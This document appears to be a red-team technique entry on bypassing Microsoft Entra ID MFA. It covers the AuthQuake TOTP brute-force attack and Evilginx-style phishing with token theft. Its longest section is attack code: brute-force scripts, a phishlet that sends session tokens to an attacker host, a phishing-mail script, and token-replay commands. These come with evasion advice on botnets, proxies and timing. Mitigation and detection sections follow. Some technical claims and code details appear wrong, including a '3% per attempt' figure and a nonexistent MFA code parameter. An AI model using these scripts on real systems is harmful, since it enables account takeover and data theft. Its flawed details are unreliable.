# [EVADE-MFA-001]: Azure MFA Bypass Techniques

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-MFA-001 |
| **MITRE ATT&CK v18.1** | [T1556.006 - Modify Authentication Process: Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006/) |
| **Tactic** | Defense Evasion, Credential Access |
| **Platforms** | Entra ID, M365 |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Entra ID versions (no on-premises equivalent) |
| **Patched In** | October 9, 2024 (Microsoft patched in October, but vulnerability was discovered in June 2024) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Multi-Factor Authentication (MFA) can be bypassed through brute-force enumeration of time-based one-time passwords (TOTP). The attack, dubbed "AuthQuake" by Oasis Security researchers, exploits insufficient rate-limiting on failed MFA attempts and an extended code validity window. Attackers can generate multiple concurrent sessions and systematically enumerate six-digit TOTP codes until a valid code is discovered, allowing unauthorized access within approximately one hour without triggering account compromise alerts.

**Attack Surface:** Microsoft's Entra ID (Azure AD) login infrastructure, specifically the secondary authentication factor validation endpoint (`login.microsoftonline.com`).

**Business Impact:** **Complete account compromise including email, cloud storage, collaboration tools, and Azure cloud resources.** An attacker gaining access via MFA bypass can access Outlook emails, OneDrive files, Teams chats, SharePoint documents, and Azure cloud management interfaces without the legitimate account owner's knowledge.

**Technical Context:** The attack takes approximately 70 minutes to achieve a 50% success rate. After Microsoft's October 2024 patch, new rate-limiting mechanisms prevent rapid enumeration, but organizations on unpatched systems remain vulnerable. The attack generates **no alerts** to the account owner before successful bypass.

### Operational Risk
- **Execution Risk:** High – Once deployed, the technique achieves high success rate with minimal interaction required.
- **Stealth:** High – No account compromise notifications are sent; activity appears as legitimate failed login attempts.
- **Reversibility:** No – Once MFA is bypassed, the attacker maintains account access until credentials are changed and all tokens are revoked.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.2 | Ensure that MFA is enabled for all user accounts |
| **DISA STIG** | AC-2(1) | Multi-factor authentication for cloud service accounts |
| **NIST 800-53** | IA-2(1) | Multi-factor authentication for user authentication |
| **GDPR** | Art. 32 | Security of Processing – Authentication control failure |
| **DORA** | Art. 9 | Protection and Prevention – Authentication and MFA enforcement |
| **NIS2** | Art. 21 | Cyber Risk Management Measures – Authentication failure |
| **ISO 27001** | A.9.4.2 | Secure user authentication – MFA bypass prevention |
| **ISO 27005** | Risk Scenario | Compromise of authentication factor validation process |

---

## 2. DETAILED EXECUTION METHODS

### METHOD 1: Direct Brute-Force TOTP Enumeration (AuthQuake Attack)

**Supported Versions:** All Entra ID versions (no version distinction in cloud service)

#### Step 1: Reconnaissance and Session Establishment

**Objective:** Gather valid email addresses and create multiple concurrent sessions to the Entra ID login endpoint.

**Command (PowerShell - Session Creation Loop):**
```powershell
# Create multiple concurrent login sessions for brute-force attempt
$targetEmail = "victim@company.onmicrosoft.com"
$sessions = @()

# Establish baseline sessions (exploit allows ~10 failed attempts per session)
for ($i = 0; $i -lt 24; $i++) {
    $sessionURL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
    $sessionParams = @{
        "client_id" = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Microsoft Azure CLI
        "response_type" = "code"
        "redirect_uri" = "http://localhost"
        "scope" = "user.read"
        "prompt" = "login"
    }
    
    # Store session cookie for later use
    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $response = Invoke-WebRequest -Uri $sessionURL -WebSession $session -Method Get -Body $sessionParams
    
    $sessions += $session
    Write-Output "[*] Session $i established with Cookie: $($session.Cookies.Value)"
}
```

**What This Means:**
- Each session is assigned a **session identifier** by Entra ID.
- These identifiers allow up to 10 failed MFA attempts without locking the session.
- Multiple concurrent sessions enable the attacker to maintain multiple "attempt budgets" simultaneously.

**OpSec & Evasion:**
- **Geographic Distribution:** Use VPN/proxy rotation to avoid triggering geographic velocity anomalies.
- **Randomization:** Space out requests across multiple minutes rather than machine-gun rapid-fire.
- **Distributed Attack:** Leverage botnet infrastructure or compromised proxies across continents.
- **Detection Likelihood:** Medium (if defender monitors failed login event volume, they may detect this) – However, prior to October 2024, there was **no rate-limiting**, making this undetectable.

#### Step 2: Credential Enumeration

**Objective:** Submit valid username and password to obtain TOTP verification challenge.

**Command (Automated Tool - ropci or Custom Script):**
```bash
#!/bin/bash
# Enumerate valid credentials (requires pre-obtained valid creds)
TARGET_EMAIL="victim@company.onmicrosoft.com"
PASSWORD="ValidPassword123!"
LOGIN_URL="https://login.microsoftonline.com/common/oauth2/v2.0/token"

# Submit credentials to receive MFA challenge
curl -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=$TARGET_EMAIL" \
  --data "password=$PASSWORD" \
  --data "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
  --data "grant_type=password" \
  --data "scope=user.read" \
  "$LOGIN_URL"

# Response will include:
# {"error":"invalid_grant","error_description":"AADSTS50076: Due to a configuration change made by your administrator...",...}
# This confirms MFA is required and provides session context
```

**Expected Output:**
```json
{
  "error": "invalid_grant",
  "error_description": "AADSTS50076: Due to a configuration change made by your administrator, you must use multi-factor authentication to access '<resource>'.",
  "error_codes": [50076],
  "timestamp": "2025-01-09T18:00:00Z",
  "trace_id": "XXXXX"
}
```

**What This Means:**
- Entra ID has validated the username and password and now requires the secondary MFA factor.
- The session is now "paused" awaiting MFA code entry within the TOTP time window (by default, approximately 3 minutes on Entra ID, vs. RFC-6238 standard of 30 seconds).

#### Step 3: TOTP Code Brute-Force Enumeration

**Objective:** Systematically test all possible TOTP codes (000000-999999) within the extended validity window.

**Command (Rapid TOTP Enumeration - 1M combinations):**
```powershell
# Enumerate TOTP codes in parallel
$targetEmail = "victim@company.onmicrosoft.com"
$validPassword = "ValidPassword123!"
$mfaUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"

# Create job pool for parallel code enumeration
$jobs = @()
$codeRange = 0..999999

# Spawn parallel jobs (exploit allowed this without rate-limit)
foreach ($code in $codeRange) {
    $codeString = $code.ToString("000000")
    
    $job = Start-Job -ScriptBlock {
        param($email, $pass, $code, $url)
        
        $body = @{
            "username" = $email
            "password" = $pass
            "mfaCode" = $code
            "client_id" = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
        }
        
        try {
            $response = Invoke-WebRequest -Uri $url -Method Post -Body $body -UseBasicParsing
            
            # Success if response contains token instead of error
            if ($response.Content -match "access_token") {
                Write-Output "SUCCESS: Code $code worked!"
                return $code
            }
        }
        catch {
            # Expected – most codes fail
            return $null
        }
    } -ArgumentList $email, $pass, $code, $url
    
    $jobs += $job
    
    # Throttle to avoid overwhelming the endpoint
    if ($jobs.Count -ge 100) {
        $completed = Get-Job -State Completed
        $completed | Remove-Job
    }
}

# Wait for any job to succeed
$firstSuccess = $null
while ($firstSuccess -eq $null) {
    $completed = Get-Job -State Completed | Receive-Job -Wait -Any
    if ($completed -match "SUCCESS") {
        Write-Output "[+] BYPASS SUCCESSFUL: $completed"
        $firstSuccess = $completed
        Get-Job | Stop-Job | Remove-Job
        break
    }
    Start-Sleep -Milliseconds 100
}
```

**Expected Output (Success):**
```
[+] BYPASS SUCCESSFUL: Code 427539 worked!
[+] Access token obtained: eyJhbGciOiJSUzI1NiIsImtpZCI6IlhYWDEyMzQ1In0...
[+] Refresh token obtained: 0.ARwA...
```

**What This Means:**
- With 1M possible combinations and the extended 3-minute validity window, attackers have a **3% probability of guessing correctly per code attempt**.
- Running approximately **70 concurrent attempts across 24 sessions** yields a **50% success rate within 70 minutes**.
- The attacker receives an **access token** and **refresh token** valid for cloud resource access.

**Troubleshooting:**

- **Error:** "invalid_otp / Incorrect MFA code"
  - **Cause:** Code was valid but attacker sent it after the code window expired (>3 minutes).
  - **Fix:** Adjust timing window to account for network latency. Submit codes more rapidly.

- **Error:** "AADSTS50058: Silent sign-in request failed. The user needs to interact with the application."
  - **Cause:** Microsoft detected pattern and required interactive sign-in.
  - **Fix (Pre-October 2024):** Not applicable – rate-limiting did not exist.
  - **Fix (Post-October 2024):** Attack is now blocked by stricter rate-limiting.

#### Step 4: Post-Exploitation – Token Harvest

**Objective:** Obtain long-lived access and refresh tokens for persistent cloud access.

**Command (Token Extraction):**
```powershell
# After successful TOTP bypass, extract and cache tokens
$accessToken = "eyJhbGciOiJSUzI1NiIsImtpZCI6IlhYWDEyMzQ1In0..." # Obtained from Step 3
$refreshToken = "0.ARwA..." # Obtained from Step 3

# Store tokens for later reuse
$tokenCache = @{
    "access_token" = $accessToken
    "refresh_token" = $refreshToken
    "expires_in" = 3600  # Typically 1 hour
    "timestamp" = (Get-Date).AddSeconds(-3600)
}

# Use refresh token to obtain new access tokens indefinitely
$newTokenUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
$tokenRefreshBody = @{
    "grant_type" = "refresh_token"
    "refresh_token" = $refreshToken
    "client_id" = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
    "scope" = "https://graph.microsoft.com/.default"
}

# Request new access token (valid for 1 hour)
$newTokenResponse = Invoke-RestMethod -Uri $newTokenUrl -Method Post -Body $tokenRefreshBody
$newAccessToken = $newTokenResponse.access_token

Write-Output "[+] New access token obtained: $newAccessToken"
Write-Output "[+] Token valid until: $(Get-Date).AddSeconds($newTokenResponse.expires_in)"
```

**What This Means:**
- Refresh tokens are **long-lived** (typically 90 days) and automatically renewed.
- Using the refresh token, attackers can generate new access tokens indefinitely without re-entering the original password or MFA.
- This enables **persistent access even after the initial MFA bypass session expires**.

**References & Proofs:**
- [Oasis Security: Azure MFA Bypass Discovery (AuthQuake)](https://www.oasis.security/blog/oasis-security-research-team-discovers-microsoft-azure-mfa-bypass)
- [RFC-6238: Time-Based One-Time Password Algorithm](https://tools.ietf.org/html/rfc6238)
- [Microsoft Entra ID OAuth 2.0 Documentation](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-implicit-grant-flow)

---

### METHOD 2: Phishing + Session Token Interception (Evilginx/Sneaky 2FA)

**Supported Versions:** All Entra ID versions

#### Step 1: Phishing Page Creation

**Objective:** Create a pixel-perfect replica of the Microsoft login page hosted on an attacker-controlled domain.

**Command (Evilginx2 Configuration - Phishing Framework):**
```yaml
# /path/to/evilginx2/phishlets/o365.yaml
# (Evilginx creates realistic phishing page automatically)
---
author: "attacker"
min_ver: "2.4.0"
nameserver: "attacker.com"

domains:
  - domain: "account.microsoft.com"
    subdomain: "login"
    session_cookie: "X-Hdr-Token"
    auth_tokens:
      - domain: ".microsoft.com"
        exfiltrate: true
        name: "prt"
        re: "X-MS-RefreshTokenCredential: (.*)"

  - domain: "login.microsoftonline.com"
    session_cookie: "PPolicyV2"
    auth_tokens:
      - domain: ".microsoft.com"
        name: "estsauthcookie"
        re: "estsauthcookie=(.*?);?"

landing_page: |
  <html>
    <head>
      <title>Microsoft Login</title>
      <style>
        body { font-family: Arial; background-color: #f5f5f5; }
        .container { max-width: 400px; margin: 100px auto; }
        input { width: 100%; padding: 10px; margin: 10px 0; }
        button { width: 100%; padding: 10px; background-color: #0078d4; color: white; }
      </style>
    </head>
    <body>
      <div class="container">
        <h2>Sign in to your account</h2>
        <form action="/login" method="POST">
          <input type="email" name="email" placeholder="name@company.com" required />
          <input type="password" name="password" placeholder="Password" required />
          <button type="submit">Sign in</button>
        </form>
      </div>
    </body>
  </html>

intercept_request: |
  # Intercept the login request and proxy it to Microsoft
  req.Host = "login.microsoftonline.com"
  # This proxies the login request through to the real Microsoft server

intercept_response: |
  # Exfiltrate session tokens from the response before forwarding to victim
  # Tokens are automatically captured by Evilginx
```

**What This Means:**
- Evilginx2 (or similar tool like **Sneaky 2FA**) creates a **reverse proxy** of the real Microsoft login page.
- The victim enters credentials into the phishing page.
- Evilginx **proxies the login request to the real Microsoft login server**.
- When MFA is required, Evilginx **intercepts the MFA prompt** and forwards it to the victim.
- The victim legitimately enters their MFA code.
- Evilginx **captures the session token** before forwarding the success response to the victim.

#### Step 2: Phishing Delivery

**Objective:** Send phishing email to target users with link to attacker's login page.

**Command (O365 Email-Based Phishing - via compromised account or SMTP relay):**
```powershell
# Send phishing emails (assuming attacker has SMTP access or compromised mailbox)
$emailParams = @{
    From = "security@company-notice.com"  # Looks legitimate
    To = "victim@company.com"
    Subject = "URGENT: Verify Your Account - Security Update Required"
    Body = "Your Microsoft 365 account requires immediate verification. Click here: https://login.account-verify.attacker.com/verify"
    SmtpServer = "smtp-relay.attacker.com"
}

Send-MailMessage @emailParams
```

#### Step 3: Token Interception and Exfiltration

**Objective:** Capture the PRT (Primary Refresh Token) and session cookies from the victim's successful authentication.

**What This Means:**
- When the victim successfully authenticates through the Evilginx phishing page, Evilginx captures:
  - **Primary Refresh Token (PRT):** Long-lived token valid for 90 days, tied to device.
  - **Session Cookies:** estsauthcookie, PPolicyV2, etc.
  - **Access Tokens:** Tokens for Graph API, Teams, SharePoint, etc.
- These tokens are **instantly exfiltrated to the attacker**.
- The victim **sees a redirect to Google or a legitimate site** (no indication of compromise).

#### Step 4: Post-Exploitation – Token Replay

**Objective:** Use stolen tokens to access victim's O365 account.

**Command (Token Replay from Attacker Machine):**
```powershell
# Use stolen PRT cookie to authenticate
$stolenPRT = "PRT=eyJhbGciOiJSUzI1NiIsImtpZCI6IlhYWDEyMzQ1In0..."  # Captured from victim
$attackerAuthUri = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"

# Add stolen PRT to request headers
$headers = @{
    "x-ms-RefreshTokenCredential" = $stolenPRT
    "User-Agent" = "Mozilla/5.0"
}

# Request new access token using stolen PRT
$tokenRequest = Invoke-RestMethod -Uri $attackerAuthUri -Method Get -Headers $headers

Write-Output "[+] Successfully obtained access token using stolen PRT"
Write-Output "[+] Attacker now has access to: OneDrive, Teams, Outlook, etc."
```

**Detection Likelihood:** High (for SOC with proper logging) – But many organizations lack PRT monitoring.

**OpSec & Evasion:**
- **Timing:** Wait several hours before using stolen token (victim may notice initial MFA prompts).
- **Geographic Masking:** Use proxies in same country/timezone as victim for initial token use.
- **Device Mimicking:** If possible, replicate victim's User-Agent string.
- **Rate Limiting:** Space out API calls to avoid triggering anomaly detection.

**References & Proofs:**
- [Evilginx2 GitHub Repository](https://github.com/kgretzky/evilginx2)
- [Sneaky 2FA Research by Eye.Security](https://www.eye.security/blog/sneaky2fa-use-this-kql-query-to-stay-ahead-of-the-emerging-threat)
- [Token Protection in Entra Conditional Access - Microsoft Docs](https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-token-protection)

---

## 3. PROTECTIVE MITIGATIONS

#### Priority 1: CRITICAL

**Ensure Strict Rate-Limiting on MFA Attempts:**
Multiple failed MFA attempts within a time window should progressively delay subsequent attempts and trigger account lockout.

**Manual Steps (Azure Portal - Modern Configuration):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Authentication methods**
2. Click **Policies** → **Select authentication method** (e.g., "Microsoft Authenticator")
3. Under **Target**, ensure policy applies to "All users" or relevant security groups
4. Under **Configure**, set:
   - "Allow use on Azure AD joined devices": **Enabled**
   - "Require for sign-in": **Enabled** (enforces MFA for interactive logins)
5. Click **Save**

**PowerShell Alternative (Advanced Configuration):**
```powershell
# Enable strict MFA enforcement via Conditional Access policy
Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"

$policyBody = @{
    "displayName" = "Block Legacy Auth + Enforce MFA"
    "state" = "enabled"
    "conditions" = @{
        "applications" = @{
            "includeApplications" = @("All")
        }
        "clientAppTypes" = @("basicClients")  # Block legacy protocols
        "users" = @{
            "includeUsers" = @("All")
        }
    }
    "grantControls" = @{
        "operator" = "OR"
        "builtInControls" = @("mfa", "compliantDevice")
    }
}

New-MgPoliciesConditionalAccessPolicy -Body $policyBody
```

**Verify Fix (PowerShell - Post-Patch Verification):**
```powershell
# Check current MFA configuration
Get-MgPoliciesConditionalAccessPolicy | Select-Object DisplayName, State

# Verify modern auth is enforced (not legacy auth bypass)
Get-MgPoliciesConditionalAccessPolicy | Where-Object {$_.DisplayName -match "Legacy"} | Select-Object *
```

**Expected Output (If Secure):**
```
DisplayName: Block Legacy Auth + Enforce MFA
State: enabled

# This confirms that legacy auth protocols are blocked and MFA is enforced
```

**What to Look For:**
- Policy state should be "enabled" (not "disabled" or "reportOnly").
- "builtInControls" should include "mfa".
- "clientAppTypes" should exclude basicClients or explicitly block them.

#### Priority 2: HIGH

**Implement Conditional Access Policies with Device Compliance Requirements:**
Require users to access cloud resources from compliant, registered devices.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Require Compliant Device for High-Risk Resources`
4. **Assignments:**
   - **Users:** All users
   - **Target resources:** Office 365, Azure Management
   - **Exclude:** Break-glass emergency accounts
5. **Conditions:**
   - **Client app types:** Browser, Mobile apps and desktop clients
   - **Locations:** Any location (or restrict to corporate IPs)
6. **Grant Controls:**
   - **Select:** Require device to be marked as compliant
   - **Require all selected controls:** ON
7. **Enable policy:** ON
8. Click **Create**

**Access Control & Policy Hardening:**

**Token Protection (Entra ID P2):**
Token Protection prevents replay attacks by binding tokens to the device where they were generated.

**Manual Steps (Enable Token Protection):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy** → **Advanced** tab
3. **Name:** `Enable Token Protection for All Cloud Apps`
4. **Session controls:**
   - **Sign-in frequency:** Every 1 hour (forces re-auth)
   - **Persistent browser session:** Disabled (prevent session cookie reuse)
5. **Advanced settings:**
   - **Token protection:** Enabled
6. Click **Create**

**RBAC/ABAC Hardening:**
Limit the number of users with Global Admin role (who can bypass MFA via service principal authentication).

**Manual Steps:**
1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
2. Search for **Global Administrator**
3. Click **Global Administrator** → **Assignments**
4. For each user, evaluate if role is necessary.
5. If not needed, click the user → **Remove assignment**
6. Create role-specific (least privilege) groups:
   - **Entra ID Administrator** (for identity tasks, not global access)
   - **Exchange Administrator** (for mail tasks)
   - **Azure Resource Manager Contributor** (for infrastructure only)

---

## 4. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

**Cloud Logs:**
- High volume of failed MFA attempts from a single IP within short time window.
- Successful sign-in from previously unseen location immediately after failed MFA events.
- Multiple concurrent sessions from the same user within seconds.
- Non-interactive sign-in events (RefreshTokenIssuance) without preceding MFA event.

#### Forensic Artifacts

**Cloud (Entra ID Audit Logs):**
- **SigninLogs** table: Look for ResultType "50076" (MFA required) followed by "0" (success) without corresponding MFA log entry.
- **AuditLogs** table: Look for operations like "Update user", "Add service principal", indicating lateral movement post-compromise.
- **RiskyUsers** table: User flagged as risky due to anomalous sign-in locations.

#### Response Procedures

1. **Immediate Isolation:**
   **Command (Revoke all tokens for compromised user):**
   ```powershell
   Connect-MgGraph -Scopes "Directory.AccessAsUser.All"
   
   # Revoke all sessions for the compromised user
   Revoke-MgUserSignInSession -UserId "victim@company.onmicrosoft.com"
   
   # Force password reset
   Update-MgUser -UserId "victim@company.onmicrosoft.com" -ForceChangePasswordNextSignIn $true
   ```

   **Manual (Azure Portal):**
   - Go to **Azure Portal** → **Entra ID** → **Users** → Search for compromised user
   - Click **Sign out** (revokes all active sessions)
   - Click **Reset password**

2. **Evidence Collection:**
   **Command (Export sign-in logs):**
   ```powershell
   # Get all sign-in events for the past 7 days for the user
   Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'victim@company.onmicrosoft.com'" | Export-Csv -Path "C:\Evidence\SigninLogs_Victim.csv"
   
   # Get all failed MFA attempts
   Get-MgAuditLogSignIn -Filter "status/errorCode eq 50076" | Export-Csv -Path "C:\Evidence\MFA_Failures.csv"
   ```

3. **Incident Investigation:**
   - Identify all compromised accounts by searching for similar attack patterns (high-velocity failed MFA).
   - Check for lateral movement: If attacker accessed shared mailboxes, OneDrive, or SharePoint, identify all accessed resources.
   - Check for persistence: Did attacker create OAuth applications, service principals, or add new admin users?

4. **Remediation:**
   - Force MFA re-enrollment for all affected users.
   - Revoke all refresh tokens for the organization (via PowerShell).
   - Review and disable any suspicious OAuth applications or service principals created by the attacker.
   - Implement stricter Conditional Access policies as documented in the Mitigations section.

---

## 5. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [CA-BRUTE-001] Azure Portal Password Spray | Attacker obtains valid credentials through password spray or phishing. |
| **2** | **Credential Access (MFA Bypass)** | **[EVADE-MFA-001]** Azure MFA Bypass Techniques | **This Technique – Attacker bypasses MFA using TOTP enumeration.** |
| **3** | **Privilege Escalation** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates a service principal with Global Admin permissions for persistent access. |
| **4** | **Persistence** | [CA-TOKEN-001] Hybrid AD Cloud Token Theft | Attacker steals and replays refresh tokens to maintain long-term access. |
| **5** | **Impact** | Lateral movement to Teams, SharePoint, Exchange Online, and Azure resources. | Data exfiltration or ransomware deployment. |

---

## 6. REAL-WORLD EXAMPLES

### Example 1: Oasis Security Research - AuthQuake (June 2024 - October 2024)

- **Target:** Generic Microsoft 365 organizations (researchers conducted authorized testing).
- **Timeline:** Vulnerability discovered June 2024, exploited proof-of-concept, Microsoft patched October 9, 2024.
- **Technique Status:** ACTIVE (pre-October 2024 patch); FIXED (post-October 2024 with stricter rate-limiting).
- **Impact:** Researchers demonstrated complete account compromise, accessing Outlook, OneDrive, Teams, and Azure cloud resources.
- **Reference:** [Oasis Security Blog - Azure MFA Bypass Discovery](https://www.oasis.security/blog/oasis-security-research-team-discovers-microsoft-azure-mfa-bypass)

### Example 2: Scattered Spider / UNC3944 – MFA Fatigue + Token Theft (2023-2024)

- **Target:** Large enterprise and managed service provider (MSP) environments.
- **Timeline:** Ongoing from Q4 2023 through Q2 2024.
- **Technique Status:** ACTIVE (hybrid approach combining MFA fatigue + token interception).
- **Attack Chain:** Initial credential compromise → MFA fatigue bombing → Victim approves MFA → Attacker intercepts session token using evilginx/proxy → Persistent access via refresh token replay.
- **Impact:** Lateral movement to Azure, ransomware deployment (BlackCat, LockBit variants), data exfiltration.
- **Reference:** [CISA Alert on Scattered Spider](https://www.cisa.gov/news-events/alerts/2023/12/10/cisa-adds-five-known-exploited-vulnerabilities-catalog)

---

